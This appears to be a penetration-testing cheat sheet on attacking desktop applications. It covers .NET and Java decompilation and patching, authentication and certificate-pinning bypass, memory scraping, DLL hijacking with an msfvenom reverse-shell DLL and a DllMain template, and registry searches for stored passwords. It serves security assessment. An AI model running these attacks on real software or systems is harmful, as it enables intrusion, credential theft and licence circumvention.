.NET Analysis Tools .NET 
# dnSpy - Best for debugging + patching
# Open .exe or .dll
# Features:
# - Decompile to C#
# - Edit and recompile (Edit Method)
# - Debug with breakpoints
# - Search for strings, methods

# ILSpy - Decompilation only
# Lighter alternative to dnSpy

# Free decompiler with navigation

# What to look for:
# - Hardcoded credentials
# - API keys / connection strings
# - Encryption/decryption routines
# - License validation logic
# - SQL queries
# - Authentication logic

# Bypass authentication check
# Original:
public bool ValidateUser(string user, string pass) {
    return CheckDatabase(user, pass);

public bool ValidateUser(string user, string pass) {
    return true;  // Always return true

# Patch to return true

‚òï Java Decompilation

Java Analysis Java 
# Extract JAR
unzip application.jar -d extracted/
jar -xvf application.jar

# JD-GUI - Decompiler with GUI
jd-gui application.jar

# CFR - Command line decompiler
java -jar cfr.jar application.jar --outputdir output/

# Procyon
java -jar procyon-decompiler.jar application.jar -o output/

# JADX (also for Android)
jadx application.jar -d output/
jadx-gui application.jar

# Bytecode viewer - Multiple decompilers
java -jar Bytecode-Viewer.jar

# What to look for:
# - JDBC connection strings
# - Hardcoded passwords
# - Encryption keys
# - Serialization endpoints
# - JNDI lookups (RCE potential)
Java Patching Java 
# 1. Decompile to .java
java -jar cfr.jar Target.class > Target.java

# 2. Modify the code

# 3. Recompile
javac Target.java

# 4. Replace in JAR
jar -uf application.jar Target.class

# OR use Recaf (GUI tool)
# - Edit bytecode directly
# - Save modified JAR

# Bypassing obfuscation
# - ProGuard: Renames only, logic intact
# - Allatori: String encryption
# - Zelix KlassMaster: Flow obfuscation

HTTP/HTTPS Interception Traffic 
# Burp Suite - HTTP proxy
# Configure: Proxy ‚Üí Options ‚Üí Add listener
# Install Burp CA in Windows cert store

# Set system proxy
# Settings ‚Üí Network ‚Üí Proxy ‚Üí Manual
# Or: netsh winhttp set proxy 127.0.0.1:8080

# Fiddler - Alternative HTTP proxy
# Good for .NET apps (same vendor)

# mitmproxy - Command line
mitmproxy -p 8080

# Certificate pinning bypass:
# 1. Find certificate validation code
# 2. Patch to always return true
# 3. Or replace embedded cert with Burp's
Non-HTTP Traffic Traffic 
# Wireshark - Packet capture
# Filter: tcp.port == 1234
# Follow TCP stream

# Echo Mirage - TCP proxy
# Intercept and modify TCP traffic
# Inject into running process

# Nmap packet capture
nmap --packet-trace -p PORT TARGET

# tcpdump
tcpdump -i eth0 port 1234 -w capture.pcap

# For encrypted non-HTTP:
# 1. Find encryption routine in code
# 2. Extract keys from memory
# 3. Or hook encryption functions

Memory Inspection Memory 
# Cheat Engine - Memory scanner
# 1. Attach to process
# 2. Search for known values
# 3. Narrow down with changed values
# 4. Modify memory directly

# Process Hacker - Memory dump
# Right-click process ‚Üí Miscellaneous ‚Üí Dump

# Strings from memory dump

# - Credentials in plaintext

# - Session tokens
# - API keys

üìö DLL Hijacking

DLL Hijacking Detection DLL 
# Process Monitor - Find missing DLLs
procmon.exe
# Filter: Result = NAME NOT FOUND
# Filter: Path ends with .dll
# Look for writable locations before System32

# DLL Search Order (Windows):
# 1. Application directory
# 2. System directory (C:\Windows\System32)
# 3. 16-bit system directory
# 4. Windows directory
# 5. Current directory
# 6. PATH environment variable

# Check for writable app directory
icacls "C:\Program Files\App\"

# PowerSploit - Find DLL hijack opportunities
Find-ProcessDLLHijack
Find-PathDLLHijack
DLL Hijacking Exploitation DLL 
# Create malicious DLL (msfvenom)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll > hijack.dll

# Create DLL with proxy (maintain functionality)
# Use DLL Export Viewer to find exports
# Forward exports to original DLL

# Simple C DLL template
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        WinExec("calc.exe", 0);  // Or reverse shell
    }
    return TRUE;
}

# Compile with MinGW
x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c

# Place in vulnerable path and restart app

Registry Inspection 
# Common app registry locations
HKEY_CURRENT_USER\Software\AppName
HKEY_LOCAL_MACHINE\SOFTWARE\AppName
HKEY_CURRENT_USER\Software\Classes\

# Process Monitor - Registry activity
# Filter: Operation contains Reg

# RegShot - Before/after comparison
# 1st shot ‚Üí Install/run app ‚Üí 2nd shot ‚Üí Compare

# Search registry
reg query HKCU\Software /s /f password
reg query HKLM\SOFTWARE /s /f password

# PowerShell registry search
Get-ChildItem -Path HKCU:\Software -Recurse | Get-ItemProperty | Where-Object { $_ -match "password" }

# Export registry key
reg export HKCU\Software\AppName export.reg

# Look for:
# - Stored credentials
# - License keys
# - Installation paths
# - Configuration settings
